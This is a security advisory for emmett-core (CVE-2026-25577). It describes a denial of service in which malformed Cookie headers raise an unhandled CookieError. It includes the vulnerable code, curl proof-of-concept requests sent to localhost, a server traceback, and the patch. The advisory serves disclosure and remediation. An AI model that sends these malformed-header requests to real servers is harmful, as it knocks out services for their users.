# [H] Emmett-Core: Unhandled CookieError Exception Causing Denial of Service

## Summary
Severity: High
Advisory: GHSA-x6cr-mq53-cc76
CVE: CVE-2026-25577
CWE: CWE-248, CWE-703
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-10
Source: https://github.com/advisories/GHSA-x6cr-mq53-cc76
Type: github-advisory

## Affected
- PyPI: `emmett-core` — affected >=0 <1.3.11

## Details
### Summary
The `cookies` property in `emmett_core.http.wrappers.Request` does not handle 
`CookieError` exceptions when parsing malformed Cookie headers. This allows 
unauthenticated attackers to trigger HTTP 500 errors and cause denial of service.


### Details

**Location:** `emmett_core/http/wrappers/__init__.py` (line 64)

**Vulnerable Code:**
```python
@cachedprop
def cookies(self) -> SimpleCookie:
    cookies: SimpleCookie = SimpleCookie()
    for cookie in self.headers.get("cookie", "").split(";"):
        cookies.load(cookie)  # No exception handling
    return cookies
```

### PoC
Sending cookies containing special characters such as /(){} will result in insufficient error handling and a server error.
```bash
$ curl -w "\nTime: %{time_total}s\n" http://localhost:8000/ -H "Cookie:/security=test"
Internal error
Time: 0.024363s
```
After the same error occurs several times, the server cannot process it normally.
```bash
$ curl -w "\nTime: %{time_total}s\n" http://localhost:8000/ -H "Cookie:(security=test"
Internal error
Time: 60.069334s

$ curl -w "\nTime: %{time_total}s\n" http://localhost:8000/ -H "Cookie:security=test"
Internal error
Time: 60.074031s
```

This is server log.
```bash
[2026-02-03 08:23:40,541] ERROR in handlers: Application exception:
Traceback (most recent call last):
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett/rsgi/handlers.py", line 70, in dynamic_handler
    http = await self.router.dispatch(request, response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/routing/router.py", line 240, in dispatch
    return await match.dispatch(reqargs, response)
           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/routing/dispatchers.py", line 57, in dispatch
    await self._parallel_flow(self.flow_open)
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/routing/dispatchers.py", line 17, in _parallel_flow
    raise task.exception()
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/sessions.py", line 102, in open_request
    if self.cookie_name in self.current.request.cookies:
                           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/utils.py", line 37, in __get__
    obj.__dict__[self.__name__] = rv = self.fget(obj)
                                       ~~~~~~~~~^^^^^
  File "/home/geonwoo/.local/lib/python3.13/site-packages/emmett_core/http/wrappers/__init__.py", line 64, in cookies
    cookies.load(cookie)
    ~~~~~~~~~~~~^^^^^^^^
  File "/usr/lib/python3.13/http/cookies.py", line 516, in load
    self.__parse_string(rawdata)
    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/http/cookies.py", line 580, in __parse_string
    self.__set(key, rval, cval)
    ~~~~~~~~~~^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/http/cookies.py", line 472, in __set
    M.set(key, real_value, coded_value)
    ~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3.13/http/cookies.py", line 335, in set
    raise CookieError('Illegal key %r' % (key,))
http.cookies.CookieError: Illegal key '/security'
```

### Impact
This vulnerability allows unauthenticated attackers to cause denial of service 
and performance degradation by sending malformed Cookie headers. 
After this vulnerability occurs, we expect it to be difficult to use the normal service.



### patch 
`/emmett_core/http/wrappers/__init__.py`
```python
- from http.cookies import SimpleCookie 
+ from http.cookies import SimpleCookie, CookieError  # add CookieError
...
...
    @cachedprop
    def cookies(self) -> SimpleCookie:
        cookies: SimpleCookie = SimpleCookie()
        for cookie in self.headers.get("cookie", "").split(";"):
-           cookies.load(cookie)
+           try:
+               cookies.load(cookie)
+            except CookieError:
+                continue
        return cookies
```

## References
- https://github.com/emmett-framework/core/security/advisories/GHSA-x6cr-mq53-cc76
- https://nvd.nist.gov/vuln/detail/CVE-2026-25577
- https://github.com/emmett-framework/core/commit/9557ea23a27cbadf7774d8bca6bbe4b54fa8a3ec
- https://github.com/emmett-framework/core/commit/c126757133e118119a280b58f3bb345b1c9a8a2a
- https://github.com/emmett-framework/core
